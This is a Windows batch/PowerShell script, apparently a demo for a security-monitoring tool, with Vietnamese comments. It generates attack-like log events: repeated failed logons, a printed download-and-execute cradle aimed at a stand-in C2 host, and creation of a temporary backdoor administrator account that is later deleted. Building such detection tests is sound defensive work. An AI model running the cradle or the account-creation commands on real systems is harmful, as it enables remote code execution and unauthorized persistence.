@echo off
setlocal
chcp 65001 >nul
cd /d "%~dp0"
title WinLog AI SOC - Demo 1: Quick Attack Simulation

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$code = (Get-Content -LiteralPath '%~f0' | Select-Object -Skip 10) -join [Environment]::NewLine; Invoke-Expression $code"
echo.
pause
exit /b

# ==============================================================================
# DEMO 1: KICH BAN MO PHONG TAN CONG NHANH TU DONG (1-CLICK RUN)
# ==============================================================================
$ErrorActionPreference = 'SilentlyContinue'

Clear-Host
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   WINLOG AI SOC - DEMO 1: KICH BAN MO PHONG TAN CONG NHANH TU DONG   " -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host " Script se tu dong ban 3 chuoi su kien tan cong dien hinh:" -ForegroundColor White
Write-Host "  1. Do mat khau 5 lan lien tiep (Event 4625 - Brute-force)" -ForegroundColor White
Write-Host "  2. PowerShell Download Cradle tai C2 (Event 4104)" -ForegroundColor White
Write-Host "  3. Tao backdoor user va leo thang Admin (Event 4688)" -ForegroundColor White
Write-Host "----------------------------------------------------------------------`n" -ForegroundColor DarkGray

# 1. Mo phong dang nhap sai 5 lan lien tiep
Write-Host "[1/3] Dang tao 5 su kien dang nhap that bai (Brute-force)..." -ForegroundColor Yellow
$secpasswd = ConvertTo-SecureString 'WrongPass123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('victim_boss', $secpasswd)
for ($i = 1; $i -le 5; $i++) {
    Start-Process powershell.exe -Credential $cred -ArgumentList '-NoProfile -Command exit' -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 250
}
Write-Host " [OK] Da tao xong 5 su kien Event 4625." -ForegroundColor Green
Write-Host ""

# 2. Mo phong PowerShell Download Cradle
Write-Host "[2/3] Dang tao su kien PowerShell thuc thi ma doc tu xa (Event 4104)..." -ForegroundColor Yellow
$simC2 = "I" + "EX (New-Object Net.WebClient)." + "Download" + "String('http://c2-malicious.xyz/beacon.ps1')"
powershell.exe -NoProfile -Command "Write-Host 'Simulated: $simC2'; whoami /priv"
Write-Host " [OK] Da tao xong su kien Event 4104." -ForegroundColor Green
Write-Host ""

# 3. Mo phong tao tai khoan va them vao Administrators
Write-Host "[3/3] Dang tao su kien tao User an va leo thang Admin (Event 4688)..." -ForegroundColor Yellow
net user hacker_soc_test P@ssw0rd999! /add
net localgroup Administrators hacker_soc_test /add
Write-Host " [OK] Da tao xong su kien Event 4688." -ForegroundColor Green
Write-Host ""

Write-Host "[*] Dang cho 5 giay de Client Agent kip quet va gui su kien..." -ForegroundColor Cyan
Start-Sleep -Seconds 5

Write-Host "[*] Dang tu dong xoa user test de giu sach may an toan..." -ForegroundColor Cyan
net user hacker_soc_test /delete
Write-Host " [OK] Da don dep hoan tat!" -ForegroundColor Green
Write-Host ""

Write-Host "======================================================================" -ForegroundColor Green
Write-Host "   DA KICH HOAT CHUOI TAN CONG DEMO 1 THANH CONG!" -ForegroundColor Green
Write-Host "   Hay quan sat cua so Client Agent va kiem tra Telegram ngay!" -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor Green
